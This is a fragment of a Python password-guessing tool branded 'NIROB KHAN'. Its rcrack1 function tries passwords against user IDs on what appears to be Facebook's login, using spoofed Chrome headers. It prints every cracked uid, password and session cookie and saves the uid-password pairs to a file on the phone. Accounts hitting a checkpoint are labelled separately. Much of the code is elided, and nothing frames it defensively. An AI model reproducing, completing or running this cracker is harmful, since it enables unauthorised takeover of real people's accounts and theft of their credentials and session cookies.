...
logo = ("""
   _   _ _____ _____   ____  ____    _  ___    _          _   _ 
 | \ | |_   _|  __ \ / __ \|  _ \  | |/ / |  | |   /\   | \ | |
 |  \| | | | | |__) | |  | | |_) | | ' /| |__| |  /  \  |  \| |
 | . ` | | | |  _  /| |  | |  _ <  |  < |  __  | / /\ \ | . ` |
 | |\  |_| |_| | \ \| |__| | |_) | | . \| |  | |/ ____ \| |\  |
 |_| \_|_____|_|  \_\\____/|____/  |_|\_\_|  |_/_/    \_\_| \_|                     
""")
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="112.0.5658.207", "Google Chrome";v="112.0.5658.207"',
            'sec-ch-ua-mobile': '?0',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[NIROB-OK🌻] {uid}|{ps}")
                print(f"\n[COOKIE🎁] : {coki}")
                open('/sdcard/Nirob-IN/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[NIROB-CP❌] {uid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[NIROB💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
